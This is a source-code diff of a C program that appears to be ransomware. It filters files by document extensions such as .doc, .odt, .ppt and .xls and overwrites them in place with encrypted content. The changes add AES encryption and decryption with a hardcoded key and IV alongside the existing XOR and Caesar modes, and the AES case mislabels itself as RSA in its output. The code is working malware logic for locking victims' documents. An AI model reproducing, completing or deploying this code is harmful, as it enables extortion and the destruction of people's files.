@@ -66,51 +66,122 @@ void writeFile(const char *name, uint8_t *content, uint64_t size) {
 	fwrite(content, 1, size, fp);
 }
 
-void handleFile(char *filename, FileStruct *file, int encoder_ID, char *args[]){
-	if (checkFile(filename) == 1){
-		return;	
-	} 
+void handleFile(char *filename, FileStruct *file, int encoder_ID, char *args[]) {
+    if (checkFile(filename) == 1) {
+        return;  
+    }
 
-	// Read file to buffer
-	if (loadFile(filename, file) == 1){
-		return;
-	}
-
-	// Encrypt file
-
-	// Write file to disk
+    // Write file to disk
     switch (encoder_ID) {
-        case 1:
-	        XOR_encoder_decoder(file->buffer, file->size); 
+        case 1:{
+            // Read file to buffer
+            if (loadFile(filename, file) == 1) {
+                return;
+            }
+            XOR_encoder_decoder(file->buffer, file->size);
             printf("Encoding using XOR\n");
+            writeFile(filename, file->buffer, file->size);
+            free(file->buffer);
             break;
-        case 2:
+        }
+        case 2:{
+            // Read file to buffer
+            if (loadFile(filename, file) == 1) {
+                return;
+            }
             caesar_encoder(file->buffer, file->size, atoi(args[3]));
             printf("Encoding using Caesar\n");
+            writeFile(filename, file->buffer, file->size);
+            free(file->buffer);
             break;
-        case 3:
+        }
+        case 21:{
+            // Read file to buffer
+            if (loadFile(filename, file) == 1) {
+                return;
+            }
             caesar_decoder(file->buffer, file->size, atoi(args[3]));
             printf("Decoding using Caesar\n");
+            writeFile(filename, file->buffer, file->size);
+            free(file->buffer);
             break;
-    }
-	writeFile(filename, file->buffer, file->size);
+        }
+        case 3:{
+            printf("Encoding using RSA\n");
+            unsigned char key[AES_KEY_SIZE] = {
+                0x7c, 0x7d, 0x39, 0xd6, 0xac, 0xb8, 0xd9, 0x18,
+                0xf4, 0xe1, 0xc8, 0x4a, 0x76, 0x8c, 0x05, 0xef,
+                0x34, 0xc6, 0x4f, 0xa2, 0x76, 0x76, 0xf3, 0x9e,
+                0x94, 0xf1, 0x08, 0x71, 0xb7, 0x5b, 0x7c, 0x3a
+            };
+            unsigned char iv[AES_IV_SIZE] = {
+                0x4d, 0x7f, 0x8e, 0x3b, 0xde, 0xaf, 0x31, 0xc1,
+                0x94, 0x75, 0xfe, 0x8e, 0x1a, 0x83, 0xe1, 0x7b
+            };
 
-	// Free to the next
-	free(file->buffer);
+            unsigned char *input_data, *output_data;
+            uint64_t input_size, output_size;
+            // Load the input file into memory
+            if (AES_loadFile(filename, &input_data, &input_size) != 0) {
+                fprintf(stderr, "Error loading file\n");
+                return;
+            }
+            output_data = (unsigned char *)malloc(input_size + AES_BLOCK_SIZE);
+
+            // Encrypt the data
+            output_size = AES_encrypt(input_data, input_size, key, iv, output_data);
+            printf("Encrypted size: %llu\n", output_size);
+
+            AES_writeFile(filename, output_data, output_size);
+
+            free(input_data);
+            free(output_data);
+            free(file->buffer);
+            break;
+        }
+        case 31:{
+            unsigned char key[AES_KEY_SIZE] = {
+                0x7c, 0x7d, 0x39, 0xd6, 0xac, 0xb8, 0xd9, 0x18,
+                0xf4, 0xe1, 0xc8, 0x4a, 0x76, 0x8c, 0x05, 0xef,
+                0x34, 0xc6, 0x4f, 0xa2, 0x76, 0x76, 0xf3, 0x9e,
+                0x94, 0xf1, 0x08, 0x71, 0xb7, 0x5b, 0x7c, 0x3a
+            };
+            unsigned char iv[AES_IV_SIZE] = {
+                0x4d, 0x7f, 0x8e, 0x3b, 0xde, 0xaf, 0x31, 0xc1,
+                0x94, 0x75, 0xfe, 0x8e, 0x1a, 0x83, 0xe1, 0x7b
+            };
+
+            unsigned char *input_data;
+            uint64_t input_size;
+            // Load the input file into memory
+            if (AES_loadFile(filename, &input_data, &input_size) != 0) {
+                fprintf(stderr, "Error loading file\n");
+                return;
+            }
+            unsigned char *decrypted_data = (unsigned char *)malloc(input_size + AES_BLOCK_SIZE);
+            uint64_t decrypted_size = AES_decrypt(input_data, input_size, key, iv, decrypted_data);
+            printf("Decrypted size: %llu\n", decrypted_size);
+
+            AES_writeFile(filename, decrypted_data, decrypted_size);
+
+            free(input_data);
+            free(decrypted_data);
+            free(file->buffer);
+        }
+    }
 
 }
 
 
 int checkFile(const char *name) {
-	if (strcasestr(name, ".doc") != NULL) return 0;
-	if (strcasestr(name, ".odt") != NULL) return 0;
+    if (strcasestr(name, ".doc") != NULL) return 0;
+    if (strcasestr(name, ".odt") != NULL) return 0;
 	if (strcasestr(name, ".rtf") != NULL) return 0;
 	if (strcasestr(name, ".md") != NULL) return 0;
 	if (strcasestr(name, ".wpd") != NULL) return 0;
 	if (strcasestr(name, ".ppt") != NULL) return 0;
 	if (strcasestr(name, ".pps") != NULL) return 0;
 	if (strcasestr(name, ".odp") != NULL) return 0;
-	if (strcasestr(name, ".key") != NULL) return 0;
 	if (strcasestr(name, ".ods") != NULL) return 0;
 	if (strcasestr(name, ".xlr") != NULL) return 0;
 	if (strcasestr(name, ".xls") != NULL) return 0;
